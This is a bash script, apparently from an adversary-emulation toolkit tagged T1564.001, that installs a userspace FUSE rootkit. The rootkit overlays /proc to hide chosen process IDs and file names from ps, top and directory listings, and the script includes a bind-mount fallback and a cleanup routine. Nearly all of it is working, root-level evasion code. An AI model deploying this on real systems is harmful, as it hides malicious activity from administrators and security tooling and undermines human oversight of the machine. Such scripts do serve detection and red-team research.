#!/bin/bash
# T1564.001 — Hide Artifacts: FUSE Filesystem Hiding
# Overlay /proc or directories with FUSE to hide processes/files without kernel module

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_fuse"
WORKDIR="/tmp/.${MARKER}"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1564.001 — FUSE Filesystem Hiding          ║"
    echo "  ║   Userspace rootkit — no kernel module needed  ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

deploy_fuse_hide() {
    echo -e "${CYAN}[*] Deploying FUSE-based process/file hiding${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    echo -e "${YELLOW}[*] FUSE overlays a directory with a userspace filesystem handler."
    echo -e "    Filtering readdir() hides PIDs from /proc or files from any directory."
    echo -e "    No kernel module needed — pure userspace rootkit.${NC}"
    echo ""

    if ! command -v python3 &>/dev/null; then
        echo -e "${RED}[!] python3 required${NC}"; return
    fi

    # Check for fusepy
    if ! python3 -c "import fuse" 2>/dev/null && ! python3 -c "from fusepy import FUSE" 2>/dev/null; then
        echo -e "${YELLOW}[*] Installing fusepy...${NC}"
        pip3 install fusepy 2>/dev/null || pip install fusepy 2>/dev/null
        if ! python3 -c "from fuse import FUSE" 2>/dev/null; then
            echo -e "${RED}[!] fusepy install failed — using C passthrough approach${NC}"
            deploy_fuse_c_fallback
            return
        fi
    fi

    read -p "  PIDs to hide (comma-separated, or 'auto' for current shell): " HIDE_PIDS
    [[ "$HIDE_PIDS" == "auto" || -z "$HIDE_PIDS" ]] && HIDE_PIDS="$$"
    read -p "  File names to hide (comma-separated): " HIDE_FILES
    [[ -z "$HIDE_FILES" ]] && HIDE_FILES=".d3m0n,${MARKER}"

    mkdir -p "$WORKDIR"

    cat > "${WORKDIR}/fuse_rootkit.py" << PYEOF
#!/usr/bin/env python3
"""FUSE-based process and file hiding rootkit"""
import os, sys, errno, stat

try:
    from fuse import FUSE, FuseOSError, Operations
except ImportError:
    from fusepy import FUSE, FuseOSError, Operations

HIDDEN_PIDS = set(${HIDE_PIDS//,/ }.split() if ',' not in '${HIDE_PIDS}' else [p.strip() for p in '${HIDE_PIDS}'.split(',')])
HIDDEN_NAMES = set([n.strip() for n in '${HIDE_FILES}'.split(',')])
REAL_ROOT = '/proc.orig'

class ProcHideFS(Operations):
    def __init__(self, root):
        self.root = root

    def _real(self, path):
        return os.path.join(self.root, path.lstrip('/'))

    def getattr(self, path, fh=None):
        real = self._real(path)
        try:
            st = os.lstat(real)
        except OSError as e:
            raise FuseOSError(e.errno)
        return {k: getattr(st, k) for k in (
            'st_atime', 'st_ctime', 'st_gid', 'st_mode',
            'st_mtime', 'st_nlink', 'st_size', 'st_uid')}

    def readdir(self, path, fh):
        real = self._real(path)
        entries = ['.', '..']
        try:
            for name in os.listdir(real):
                # Hide PIDs
                if path == '/' and name.isdigit() and name in HIDDEN_PIDS:
                    continue
                # Hide named files
                if name in HIDDEN_NAMES:
                    continue
                entries.append(name)
        except OSError:
            pass
        return entries

    def readlink(self, path):
        return os.readlink(self._real(path))

    def read(self, path, length, offset, fh):
        real = self._real(path)
        try:
            with open(real, 'rb') as f:
                f.seek(offset)
                return f.read(length)
        except OSError as e:
            raise FuseOSError(e.errno)

    def open(self, path, flags):
        real = self._real(path)
        return os.open(real, flags)

    def release(self, path, fh):
        os.close(fh)
        return 0

    def statfs(self, path):
        real = self._real(path)
        st = os.statvfs(real)
        return {k: getattr(st, k) for k in (
            'f_bavail', 'f_bfree', 'f_blocks', 'f_bsize',
            'f_favail', 'f_ffree', 'f_files', 'f_flag',
            'f_frsize', 'f_namemax')}

if __name__ == '__main__':
    if not os.path.exists(REAL_ROOT):
        os.makedirs(REAL_ROOT, exist_ok=True)
        os.system(f'mount --bind /proc {REAL_ROOT}')
    FUSE(ProcHideFS(REAL_ROOT), '/proc', nothreads=True, foreground=False, allow_other=True)
PYEOF
    chmod 755 "${WORKDIR}/fuse_rootkit.py"

    # Enable allow_other in fuse config
    if ! grep -q "^user_allow_other" /etc/fuse.conf 2>/dev/null; then
        echo "user_allow_other" >> /etc/fuse.conf 2>/dev/null
    fi

    # Bind mount original /proc
    if [[ ! -d /proc.orig/1 ]]; then
        mkdir -p /proc.orig
        mount --bind /proc /proc.orig
    fi

    # Start FUSE overlay
    python3 "${WORKDIR}/fuse_rootkit.py" &
    sleep 1

    echo -e "${GREEN}[+] FUSE rootkit overlay active on /proc${NC}"
    echo -e "${GREEN}[+] Hidden PIDs: ${HIDE_PIDS}${NC}"
    echo -e "${GREEN}[+] Hidden names: ${HIDE_FILES}${NC}"
    echo -e "${YELLOW}[*] Processes invisible to: ps, top, htop, /proc listing${NC}"
    echo -e "${YELLOW}[*] Real /proc at: /proc.orig${NC}"
}

deploy_fuse_c_fallback() {
    echo -e "${CYAN}[*] Using bind mount hiding as fallback${NC}"
    read -p "  PID to hide: " HIDE_PID
    [[ -z "$HIDE_PID" ]] && { echo -e "${RED}[!] PID required${NC}"; return; }

    mkdir -p /tmp/.empty_$$
    mount --bind /tmp/.empty_$$ "/proc/${HIDE_PID}" 2>/dev/null
    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}[+] PID ${HIDE_PID} hidden via bind mount${NC}"
    else
        echo -e "${RED}[!] Bind mount failed${NC}"
    fi
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up FUSE hiding...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    # Unmount FUSE
    fusermount -u /proc 2>/dev/null || umount /proc 2>/dev/null
    # Restore original /proc
    if [[ -d /proc.orig/1 ]]; then
        mount --bind /proc.orig /proc 2>/dev/null
        umount /proc.orig 2>/dev/null
        rmdir /proc.orig 2>/dev/null
    fi

    pkill -f "fuse_rootkit" 2>/dev/null
    rm -rf "$WORKDIR"
    sed -i '/user_allow_other/d' /etc/fuse.conf 2>/dev/null

    echo -e "${GREEN}[+] FUSE hiding removed${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Deploy FUSE proc hiding"
    echo -e "  ${CYAN}[2]${NC} Cleanup"
    echo ""
    read -p "Choose [1-2]: " OPT

    case "$OPT" in
        1) deploy_fuse_hide ;;
        2) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
